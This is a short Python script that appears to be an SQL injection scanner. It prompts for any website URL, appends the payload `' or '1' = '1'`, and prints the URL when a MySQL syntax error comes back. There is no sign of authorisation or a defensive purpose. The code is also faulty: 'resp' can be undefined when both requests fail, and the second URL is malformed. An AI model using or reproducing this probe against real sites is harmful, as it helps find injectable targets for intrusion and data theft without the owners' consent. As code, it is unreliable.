import sys
import urllib
import urllib.request
b=input("enter your website")
k=0
try:
        resp=urllib.request.urlopen(b + "=1\' or \'1\' = \'1\'")
       
except:
        k=1
if k == 1:
        try:
                resp=urllib.request.urlopen(b + "?id=1" + "=1\' or \'1\' = \'1\'")
               
        except:
                k=2
body=resp.read()
fullbody=body.decode('utf-8')                
if "You have an error in your SQL syntax" in fullbody:
        print(b)
else:
	print("NO")